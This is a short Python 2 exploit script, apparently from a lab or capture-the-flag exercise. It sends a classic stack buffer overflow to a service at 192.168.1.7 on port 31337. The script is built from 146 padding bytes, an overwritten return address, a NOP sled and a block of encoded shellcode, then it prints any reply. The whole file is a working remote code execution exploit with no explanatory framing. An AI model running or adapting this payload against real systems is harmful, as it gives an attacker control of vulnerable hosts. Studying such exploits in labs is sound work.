#!/usr/bin/env python2

import socket

#Setting target ip and port
RHOST = "192.168.1.7"
RPORT = 31337

#Create TCP connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#shellcode
shellcode = (
"\xda\xc8\xbb\x71\x47\x43\xa4\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x58\x17\x83\xe8\xfc\x03\x29\x54\xa1\x51\x35\xb2\xa7"
"\x9a\xc5\x43\xc8\x13\x20\x72\xc8\x40\x21\x25\xf8\x03\x67\xca"
"\x73\x41\x93\x59\xf1\x4e\x94\xea\xbc\xa8\x9b\xeb\xed\x89\xba"
"\x6f\xec\xdd\x1c\x51\x3f\x10\x5d\x96\x22\xd9\x0f\x4f\x28\x4c"
"\xbf\xe4\x64\x4d\x34\xb6\x69\xd5\xa9\x0f\x8b\xf4\x7c\x1b\xd2"
"\xd6\x7f\xc8\x6e\x5f\x67\x0d\x4a\x29\x1c\xe5\x20\xa8\xf4\x37"
"\xc8\x07\x39\xf8\x3b\x59\x7e\x3f\xa4\x2c\x76\x43\x59\x37\x4d"
"\x39\x85\xb2\x55\x99\x4e\x64\xb1\x1b\x82\xf3\x32\x17\x6f\x77"
"\x1c\x34\x6e\x54\x17\x40\xfb\x5b\xf7\xc0\xbf\x7f\xd3\x89\x64"
"\xe1\x42\x74\xca\x1e\x94\xd7\xb3\xba\xdf\xfa\xa0\xb6\x82\x92"
"\x05\xfb\x3c\x63\x02\x8c\x4f\x51\x8d\x26\xc7\xd9\x46\xe1\x10"
"\x1d\x7d\x55\x8e\xe0\x7e\xa6\x87\x26\x2a\xf6\xbf\x8f\x53\x9d"
"\x3f\x2f\x86\x32\x6f\x9f\x79\xf3\xdf\x5f\x2a\x9b\x35\x50\x15"
"\xbb\x36\xba\x3e\x56\xcd\x2d\x81\x0f\xcc\xa7\x69\x52\xce\xa6"
"\x35\xdb\x28\xa2\xd5\x8d\xe3\x5b\x4f\x94\x7f\xfd\x90\x02\xfa"
"\x3d\x1a\xa1\xfb\xf0\xeb\xcc\xef\x65\x1c\x9b\x4d\x23\x23\x31"
"\xf9\xaf\xb6\xde\xf9\xa6\xaa\x48\xae\xef\x1d\x81\x3a\x02\x07"
"\x3b\x58\xdf\xd1\x04\xd8\x04\x22\x8a\xe1\xc9\x1e\xa8\xf1\x17"
"\x9e\xf4\xa5\xc7\xc9\xa2\x13\xae\xa3\x04\xcd\x78\x1f\xcf\x99"
"\xfd\x53\xd0\xdf\x01\xbe\xa6\x3f\xb3\x17\xff\x40\x7c\xf0\xf7"
"\x39\x60\x60\xf7\x90\x20\x90\xb2\xb8\x01\x39\x1b\x29\x10\x24"
"\x9c\x84\x57\x51\x1f\x2c\x28\xa6\x3f\x45\x2d\xe2\x87\xb6\x5f"
"\x7b\x62\xb8\xcc\x7c\xa7")

#Message to send
buf = ""
buf += "A"*146 + "\x9d\xdc\x25\x77" + "\x90"*16 +  shellcode +  "C"*(2700-146-4-16-351)
buf += "\n"

#sending value
s.send(buf)

#printing what we sent
print "Sent: {0}".format(buf)

#received data from socket
data =  s.recv(1024)
print "Received: {0}".format(data)



